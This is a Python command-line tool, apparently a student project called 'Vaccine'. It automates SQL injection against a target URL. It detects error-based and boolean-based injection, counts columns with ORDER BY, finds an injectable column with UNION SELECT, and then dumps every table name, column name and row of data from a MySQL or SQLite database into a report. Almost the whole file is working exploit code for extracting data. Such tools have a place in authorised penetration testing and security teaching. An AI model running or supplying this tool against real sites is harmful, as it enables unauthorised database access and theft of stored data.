#!/usr/bin/env python3
import argparse
import requests
import re
from urllib.parse import urlparse, parse_qs, urlunparse

def args_manager():
    parser = argparse.ArgumentParser(description="Vaccine — SQL Injection Tester")
    parser.add_argument("url", help="URL cible")
    parser.add_argument(
        "-o", "--output", type=str, default="report.txt",
        help="Report file (default: report.txt)"
    )
    parser.add_argument(
        "-X", "--execute", type=str, default="GET", choices=["GET", "POST"],
        help="Method HTTP (default: GET)"
    )
    return parser.parse_args()

class Vaccine():
    def __init__(self, args):
        self.url             = args.url
        self.method          = args.execute
        self.output          = args.output
        self.session         = requests.Session()
        self.db_engine       = None
        self.vulnerability_param = None
        self.injection_type  = None
        self.base_params     = {}
        self.col_count       = 0

        parsed = urlparse(self.url)
        self.base_url = urlunparse(parsed._replace(query=""))
        print("# -- Vaccine initialize -- #")

    def get_params(self):
        parsed = urlparse(self.url)
        return {k: v[0] for k, v in parse_qs(parsed.query).items()}

    def run_request(self, params):
        if self.method == "GET":
            return self.session.get(self.base_url, params=params)
        else:
            return self.session.post(self.base_url, data=params)

    def detect_engine(self):
        params = self.get_params()

        if self.method == "POST" and not params:
            params = {}
            print("# -- POST detected — settings to inject -- #")
            for field in ["username", "password"]:
                val = input(f"    Valor for '{field}': ").strip()
                params[field] = val

        if not params:
            print("# -- No param founded -- #")
            return False

        error_signatures = {
            "MySQL":      ["SQL syntax", "mysql_fetch", "MySQL Error", "You have an error"],
            "SQLite":     ["SQLite error", "unrecognized token", "sqlite3", "OperationalError"],
            "PostgreSQL": ["pg_query", "PSQLException", "unterminated quoted"],
            "MSSQL":      ["Unclosed quotation", "SQLServer", "Incorrect syntax"],
            "Oracle":     ["ORA-", "Oracle error", "quoted string not properly terminated"],
        }

        base_resp = self.run_request(params)
        base_len  = len(base_resp.text)

        for p_name in params:
            original_val = params[p_name]

            # Test entier
            test = params.copy()
            test[p_name] = f"{original_val} AND 1=2-- -"
            resp = self.run_request(test)
            for engine, sigs in error_signatures.items():
                if any(s.lower() in resp.text.lower() for s in sigs):
                    self._set_vuln(engine, p_name, "integer", params)
                    return True

            # Test string (quote seule)
            test = params.copy()
            test[p_name] = f"{original_val}'"
            resp = self.run_request(test)
            for engine, sigs in error_signatures.items():
                if any(s.lower() in resp.text.lower() for s in sigs):
                    self._set_vuln(engine, p_name, "string", params)
                    return True

        return False

    def _set_vuln(self, engine, param, inj_type, params):
        self.db_engine           = engine
        self.vulnerability_param = param
        self.injection_type      = inj_type
        self.base_params         = params
        print(f"# -- Vulnerability {engine} ({inj_type}) founded on the setting : '{param}'")

    def boolean_detection(self):
        print("# -- Test boolean-based -- #")
        params = self.base_params.copy()

        if self.injection_type == "integer":
            payload_true  = f"1 AND 1=1-- -"
            payload_false = f"1 AND 1=2-- -"
        else:
            payload_true  = f"1' AND '1'='1'-- -"
            payload_false = f"1' AND '1'='2'-- -"

        params[self.vulnerability_param] = payload_true
        len_true = len(self.run_request(params).text)

        params[self.vulnerability_param] = payload_false
        len_false = len(self.run_request(params).text)

        if abs(len_true - len_false) > 10:
            print(f"# -- Boolean-based confirmed (vrai={len_true}b, faux={len_false}b) -- #")
            return True
        else:
            print(f"# -- Boolean-based not confirmed (vrai={len_true}b, faux={len_false}b) -- #")
            return False

    def find_columns_count(self):
        print("# -- Determining the number of columns with ORDER BY -- #")
        params = self.base_params.copy()

        # Verif que ORDER BY 1 fonctionne, sinon bascule le type
        test = params.copy()
        if self.injection_type == "integer":
            test[self.vulnerability_param] = "1 ORDER BY 1-- -"
        else:
            test[self.vulnerability_param] = "1' ORDER BY 1-- -"

        check = self.run_request(test)
        if any(s in check.text for s in ["SQLite error", "OperationalError", "SQL syntax", "unrecognized"]):
            self.injection_type = "string" if self.injection_type == "integer" else "integer"
            print(f"# -- Switching to injection of type : {self.injection_type} -- #")

        for i in range(1, 51):
            test = params.copy()
            if self.injection_type == "integer":
                test[self.vulnerability_param] = f"1 ORDER BY {i}-- -"
            else:
                test[self.vulnerability_param] = f"1' ORDER BY {i}-- -"

            resp = self.run_request(test)
            if any(s in resp.text for s in ["SQLite error", "SQL syntax", "OperationalError",
                                             "unrecognized", "Unknown column"]):
                count = i - 1
                print(f"# -- Number of columns : {count} -- #")
                return count

        print("# -- Impossible to determined to number of columns -- #")
        return 0

    def find_injectable_column(self):
        print("# -- Searching for injectable columns -- #")
        params = self.base_params.copy()
        marker = "VACCINE_MARKER"

        for i in range(1, self.col_count + 1):
            cols = ["NULL"] * self.col_count
            cols[i - 1] = f"'{marker}'"
            union = ",".join(cols)

            if self.injection_type == "integer":
                params[self.vulnerability_param] = f"0 UNION SELECT {union}-- -"
            else:
                params[self.vulnerability_param] = f"0' UNION SELECT {union}-- -"

            if marker in self.run_request(params).text:
                print(f"# -- Injectable columns : {i} -- #")
                return i

        print("# -- No injectable columns founded -- #")
        return None

    def union_query(self, payload_col, select_expr, from_clause):
        params = self.base_params.copy()
        cols = ["NULL"] * self.col_count
        cols[payload_col - 1] = select_expr
        union = ",".join(cols)

        if self.injection_type == "integer":
            params[self.vulnerability_param] = f"0 UNION SELECT {union} FROM {from_clause}-- -"
        else:
            params[self.vulnerability_param] = f"0' UNION SELECT {union} FROM {from_clause}-- -"

        return self.run_request(params).text

    def dump_tables(self, injectable_col):
        print("# -- Dumping the tables -- #")
        if self.db_engine == "MySQL":
            resp = self.union_query(
                injectable_col,
                "group_concat(table_name SEPARATOR '|')",
                "information_schema.tables WHERE table_schema=database()"
            )
        else:
            resp = self.union_query(
                injectable_col,
                "group_concat(name,char(124))",
                "sqlite_master WHERE type='table'"
            )
        tables = self._extract_values(resp)
        print(f"# -- Tables founded {tables} -- #")
        return tables

    def dump_columns(self, injectable_col, table):
        print(f"# -- Column of '{table}' -- #")
        if self.db_engine == "MySQL":
            resp = self.union_query(
                injectable_col,
                "group_concat(column_name SEPARATOR '|')",
                f"information_schema.columns WHERE table_name='{table}'"
            )
        else:
            resp = self.union_query(
                injectable_col,
                "group_concat(name,char(124))",
                f"pragma_table_info('{table}')"
            )
        columns = self._extract_values(resp)
        print(f"# -- Columns : {columns} -- #")
        return columns

    def dump_data(self, injectable_col, table, columns):
        print(f"# -- Data of '{table}' -- #")
        col_concat = "||char(167)||".join(columns)
        resp = self.union_query(
            injectable_col,
            f"group_concat({col_concat},char(124))",
            table
        )
        rows = self._extract_values_rows(resp)
        print(f"# -- Data of '{table}' -- #")
        for row in rows:
            fields = row.split("§")
            print(f"    {' | '.join(fields)}")
        return rows

    def _extract_values(self, text):
        match = re.search(r'<pre>(.*?)</pre>', text, re.DOTALL)
        if not match:
            return []
        raw = match.group(1).strip().split('\n')[0].strip()

        # Format 1 [ ]
        bracket = re.search(r'\[(.*?)\]', raw)
        if bracket:
            content = bracket.group(1)
            return [v.strip() for v in content.split('|') if v.strip()]

        # Format 2 
        colon = re.search(r':\s(.+?)(?:\s\(|$)', raw)
        if colon:
            content = colon.group(1)
            return [v.strip() for v in content.split('|') if v.strip()]

        # Fallback split direct sur |
        return [v.strip() for v in raw.split('|') if v.strip()]

    def _extract_values_rows(self, text):
        match = re.search(r'<pre>(.*?)</pre>', text, re.DOTALL)
        if not match:
            return []
        raw = match.group(1).strip().split('\n')[0].strip()

        bracket = re.search(r'\[(.*?)\]', raw)
        if bracket:
            content = bracket.group(1)
            return [v.strip() for v in content.split('|') if v.strip()]

        colon = re.search(r':\s(.+?)(?:\s\(|$)', raw)
        if colon:
            content = colon.group(1)
            return [v.strip() for v in content.split('|') if v.strip()]

        return [v.strip() for v in raw.split('|') if v.strip()]


    # -- Report function, place the file into a speical format for the report -- #
    def save_report(self, results, injectable_col):
        with open(self.output, "w", encoding="utf-8") as f:
            f.write("VACCINE, report of the SQL Injection\n")
            f.write("\n\n")
            f.write(f"URL              : {self.url}\n")
            f.write(f"Method           : {self.method}\n")
            f.write(f"DB Engine        : {self.db_engine}\n")
            f.write(f"Settings         : {self.vulnerability_param}\n")
            f.write(f"Injection type   : {self.injection_type}\n")
            f.write(f"Nb of columns    : {self.col_count}\n")
            f.write(f"columns injection: {injectable_col}\n\n")

            f.write("Payloads used :\n")
            f.write(f"  - Error-based  : {self.vulnerability_param}=1'\n")
            f.write(f"  - Boolean      : {self.vulnerability_param}=1 AND 1=1-- -\n")
            f.write(f"  - Union dump   : {self.vulnerability_param}=0 UNION SELECT ...\n\n")

            for table, data in results.items():
                f.write(f"[TABLE] {table}\n")
                f.write(f"  Columns : {' | '.join(data['columns'])}\n")
                f.write(f"  Data    :\n")
                for row in data.get("rows", []):
                    fields = row.split("§")
                    f.write(f"    {' | '.join(fields)}\n")
                f.write("\n")

        print(f"# -- Report saved in : {self.output} -- #")

    def scan(self):
        print(f"# -- Scanning {self.base_url} via {self.method} -- #")

        if not self.detect_engine():
            print("# -- No vulnerability founded -- #")
            return

        print(f"# -- Target found ({self.db_engine}) sur '{self.vulnerability_param}' -- #")

        self.boolean_detection()

        self.col_count = self.find_columns_count()
        if self.col_count == 0:
            print("# -- Number of column needed to continue -- #")
            return

        injectable_col = self.find_injectable_column()
        if not injectable_col:
            return

        results = {}
        tables = self.dump_tables(injectable_col)

        for table in tables:
            columns = self.dump_columns(injectable_col, table)
            if columns:
                rows = self.dump_data(injectable_col, table, columns)
                results[table] = {"columns": columns, "rows": rows}

        self.save_report(results, injectable_col)

def main():
    args = args_manager()
    vaccine = Vaccine(args)
    vaccine.scan()

if __name__ == "__main__":
    main()